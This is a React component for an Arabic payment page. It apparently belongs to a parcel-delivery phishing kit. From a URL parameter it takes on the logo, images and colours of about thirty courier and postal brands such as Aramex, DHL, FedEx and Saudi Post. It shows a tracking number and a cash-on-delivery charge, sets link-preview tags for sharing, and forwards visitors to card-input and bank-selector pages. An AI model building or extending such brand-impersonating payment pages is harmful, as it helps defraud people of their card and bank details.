import { useParams, useNavigate } from "react-router-dom";
import { Helmet } from "react-helmet-async";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getCompanyMeta } from "@/utils/companyMeta";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { CreditCard, ArrowLeft, Hash, DollarSign, Truck } from "lucide-react";
import heroAramex from "@/assets/hero-aramex.jpg";
import heroDhl from "@/assets/hero-dhl.jpg";
import heroFedex from "@/assets/hero-fedex.jpg";
import heroSmsa from "@/assets/hero-smsa.jpg";
import heroUps from "@/assets/hero-ups.jpg";
import heroEmpost from "@/assets/hero-empost.jpg";
import heroZajil from "@/assets/hero-zajil.jpg";
import heroNaqel from "@/assets/hero-naqel.jpg";
import heroSaudipost from "@/assets/hero-saudipost.jpg";
import heroKwpost from "@/assets/hero-kwpost.jpg";
import heroQpost from "@/assets/hero-qpost.jpg";
import heroOmanpost from "@/assets/hero-omanpost.jpg";
import heroBahpost from "@/assets/hero-bahpost.jpg";
import heroGenacom from "@/assets/hero-genacom.jpg";
import heroAlbaraka from "@/assets/hero-albaraka.jpg";
import heroAlfuttaim from "@/assets/hero-alfuttaim.jpg";
import heroAlshaya from "@/assets/hero-alshaya.jpg";
import heroBahri from "@/assets/hero-bahri.jpg";
import heroShipco from "@/assets/hero-shipco.jpg";
import heroHellmann from "@/assets/hero-hellmann.jpg";
import heroDsv from "@/assets/hero-dsv.jpg";
import heroJinakum from "@/assets/hero-jinakum.jpg";
import heroBg from "@/assets/hero-bg.jpg";

const PaymentDetails = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData } = useLink(id);

  const urlParams = new URLSearchParams(window.location.search);
  const serviceKey = urlParams.get('company') || linkData?.payload?.service_key || urlParams.get('service') || 'aramex';
  const titleParam = urlParams.get('title');

  const serviceName = linkData?.payload?.service_name || serviceKey;
  const branding = getServiceBranding(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);
  const shippingInfo = linkData?.payload as any;

  const dynamicTitle = titleParam || companyMeta.title || `Payment - ${serviceName}`;
  const dynamicDescription = companyMeta.description || `Complete your payment for ${serviceName}`;
  const dynamicImage = companyMeta.image;

  const countryCode = shippingInfo?.selectedCountry || "SA";

  const rawAmount = shippingInfo?.cod_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, countryCode);
  
  const heroImages: Record<string, string> = {
    'aramex': heroAramex,
    'dhl': heroDhl,
    'dhlkw': heroDhl,
    'dhlqa': heroDhl,
    'dhlom': heroDhl,
    'dhlbh': heroDhl,
    'fedex': heroFedex,
    'smsa': heroSmsa,
    'ups': heroUps,
    'empost': heroEmpost,
    'zajil': heroZajil,
    'naqel': heroNaqel,
    'saudipost': heroSaudipost,
    'kwpost': heroKwpost,
    'qpost': heroQpost,
    'omanpost': heroOmanpost,
    'bahpost': heroBahpost,
    'genacom': heroGenacom,
    'jinaken': heroGenacom,
    'albaraka': heroAlbaraka,
    'alfuttaim': heroAlfuttaim,
    'alshaya': heroAlshaya,
    'bahri': heroBahri,
    'national': heroBahri,
    'shipco': heroShipco,
    'hellmann': heroHellmann,
    'dsv': heroDsv,
    'jinakum': heroJinakum,
  };
  
  const heroImage = heroImages[serviceKey.toLowerCase()] || heroBg;
  
  const handleProceed = () => {
    const paymentMethod = shippingInfo?.payment_method || 'card';
    
    if (paymentMethod === 'card') {
      navigate(`/pay/${id}/card-input`);
    } else {
      navigate(`/pay/${id}/bank-selector`);
    }
  };
  
  return (
    <>
      <PaymentMetaTags
        serviceName={serviceName}
        serviceKey={serviceKey}
        amount={formattedAmount}
        title={dynamicTitle}
        description={dynamicDescription}
      />
      <Helmet>
        <meta property="og:image" content={dynamicImage} />
        <meta name="twitter:image" content={dynamicImage} />
      </Helmet>
      <div 
        className="min-h-screen bg-background" 
        dir="rtl"
      >
        {/* Hero Section */}
        <div className="relative w-full h-40 xs:h-44 sm:h-56 md:h-64 lg:h-72 overflow-hidden">
          <img 
            src={heroImage}
            alt={serviceName}
            className="w-full h-full object-cover"
          />
          <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
          
          {/* Logo Overlay */}
          <div className="absolute top-3 left-3 xs:top-4 xs:left-4 sm:top-6 sm:left-6 md:top-8 md:left-8">
            {branding.logo && (
              <div className="bg-white rounded-xl xs:rounded-2xl p-2 xs:p-3 sm:p-4 shadow-lg">
                <img 
                  src={branding.logo} 
                  alt={serviceName}
                  className="h-8 xs:h-10 sm:h-14 md:h-16 lg:h-20 w-auto"
                  onError={(e) => e.currentTarget.style.display = 'none'}
                />
              </div>
            )}
          </div>
          
          {/* Title Overlay */}
          <div className="absolute bottom-3 right-3 xs:bottom-4 xs:right-4 sm:bottom-6 sm:right-6 md:bottom-8 md:right-8 text-white">
            <div className="text-right">
              <h2 className="text-base xs:text-lg sm:text-xl md:text-2xl lg:text-3xl font-bold mb-0.5 xs:mb-1">{serviceName}</h2>
              <p className="text-[10px] xs:text-xs sm:text-sm md:text-base opacity-90">خدمة شحن</p>
            </div>
          </div>
        </div>

        <div className="container mx-auto px-3 xs:px-4 sm:px-6 md:px-8 -mt-6 xs:-mt-8 sm:-mt-10 md:-mt-12 relative z-10 pb-6 xs:pb-8 sm:pb-10 md:pb-12">
          <div className="max-w-xl xs:max-w-2xl lg:max-w-3xl xl:max-w-4xl mx-auto">
            
            <Card className="p-4 xs:p-5 sm:p-6 md:p-8 lg:p-10 shadow-2xl border-t-4 rounded-xl xs:rounded-2xl" style={{ borderTopColor: branding.colors.primary }}>
              <div className="flex items-center justify-between mb-5 xs:mb-6 sm:mb-7 md:mb-8 gap-3">
                <h1 className="text-lg xs:text-xl sm:text-2xl md:text-3xl lg:text-4xl font-bold flex-1 min-w-0">
                  تفاصيل الدفع
                </h1>
                
                <div
                  className="w-12 h-12 xs:w-14 xs:h-14 sm:w-16 sm:h-16 md:w-20 md:h-20 rounded-xl xs:rounded-2xl flex items-center justify-center shadow-lg flex-shrink-0"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
                  }}
                >
                  <CreditCard className="w-6 h-6 xs:w-7 xs:h-7 sm:w-8 sm:h-8 md:w-10 md:h-10 text-white" />
                </div>
              </div>

              {/* Shipping Info Display */}
              {shippingInfo && (
                <div className="mb-5 xs:mb-6 sm:mb-7 md:mb-8 p-3 xs:p-4 sm:p-5 rounded-lg xs:rounded-xl bg-muted/50">
                  <h3 className="font-semibold mb-2 xs:mb-3 text-xs xs:text-sm sm:text-base md:text-lg">تفاصيل الشحنة</h3>
                  <div className="space-y-2 xs:space-y-2.5 text-xs xs:text-sm sm:text-base">
                    {shippingInfo.tracking_number && (
                      <div className="flex items-center gap-2">
                        <Hash className="w-3 h-3 xs:w-3.5 xs:h-3.5 sm:w-4 sm:h-4 text-muted-foreground" />
                        <span className="text-muted-foreground">رقم الشحنة:</span>
                        <span className="font-semibold">{shippingInfo.tracking_number}</span>
                      </div>
                    )}
                    {shippingInfo.package_description && (
                      <div className="flex items-center gap-2">
                        <Truck className="w-3 h-3 xs:w-3.5 xs:h-3.5 sm:w-4 sm:h-4 text-muted-foreground" />
                        <span className="text-muted-foreground">وصف الطرد:</span>
                        <span className="font-semibold">{shippingInfo.package_description}</span>
                      </div>
                    )}
                    {shippingInfo.cod_amount > 0 && (
                      <div className="flex items-center gap-2">
                        <DollarSign className="w-3 h-3 xs:w-3.5 xs:h-3.5 sm:w-4 sm:h-4 text-muted-foreground" />
                        <span className="text-muted-foreground">مبلغ COD:</span>
                        <span className="font-semibold">{formatCurrency(shippingInfo.cod_amount, countryCode)}</span>
                      </div>
                    )}
                  </div>
                </div>
              )}
              
              {/* Payment Summary */}
              <div className="space-y-3 xs:space-y-3.5 sm:space-y-4 mb-5 xs:mb-6 sm:mb-7 md:mb-8">
                <div className="flex justify-between py-2 xs:py-2.5 sm:py-3 border-b border-border text-xs xs:text-sm sm:text-base">
                  <span className="text-muted-foreground">الخدمة</span>
                  <span className="font-semibold">{serviceName}</span>
                </div>
                
                <div 
                  className="flex justify-between py-3 xs:py-4 sm:py-5 rounded-lg xs:rounded-xl px-3 xs:px-4 sm:px-5"
                  style={{
                    background: `linear-gradient(135deg, ${branding.colors.primary}15, ${branding.colors.secondary}15)`
                  }}
                >
                  <span className="text-sm xs:text-base sm:text-lg md:text-xl font-bold">المبلغ الإجمالي</span>
                  <span className="text-lg xs:text-xl sm:text-2xl md:text-3xl font-bold" style={{ color: branding.colors.primary }}>
                    {formattedAmount}
                  </span>
                </div>
              </div>
            
              {/* Payment Method */}
              <div className="mb-5 xs:mb-6 sm:mb-7 md:mb-8">
                <h3 className="font-semibold mb-2 xs:mb-3 text-xs xs:text-sm sm:text-base md:text-lg">طريقة الدفع</h3>
                <div 
                  className="border-2 rounded-lg xs:rounded-xl p-3 xs:p-4 sm:p-5"
                  style={{
                    borderColor: branding.colors.primary,
                    background: `${branding.colors.primary}10`
                  }}
                >
                  <div className="flex items-center gap-2 xs:gap-3 sm:gap-4">
                    <CreditCard className="w-5 h-5 xs:w-6 xs:h-6 sm:w-7 sm:h-7" style={{ color: branding.colors.primary }} />
                    <div>
                      <p className="font-semibold text-xs xs:text-sm sm:text-base md:text-lg">الدفع بالبطاقة</p>
                      <p className="text-[10px] xs:text-xs sm:text-sm text-muted-foreground">
                        Visa، Mastercard، Mada
                      </p>
                    </div>
                  </div>
                </div>
              </div>
              
              {/* Proceed Button */}
              <Button
                onClick={handleProceed}
                size="lg"
                className="w-full text-sm xs:text-base sm:text-lg md:text-xl h-12 xs:h-13 sm:h-14 md:h-16 text-white rounded-lg xs:rounded-xl font-semibold transition-transform hover:scale-[1.02] active:scale-[0.98]"
                style={{
                  background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
                }}
              >
                <span className="ml-2">الدفع بالبطاقة</span>
                <ArrowLeft className="w-4 h-4 xs:w-5 xs:h-5 sm:w-5 sm:h-5 mr-2" />
              </Button>
            
              <p className="text-[10px] xs:text-xs sm:text-sm text-center text-muted-foreground mt-3 xs:mt-4 sm:mt-5">
                بالمتابعة، أنت توافق على الشروط والأحكام
              </p>
            </Card>
          </div>
        </div>
      </div>
    </>
  );
};

export default PaymentDetails;
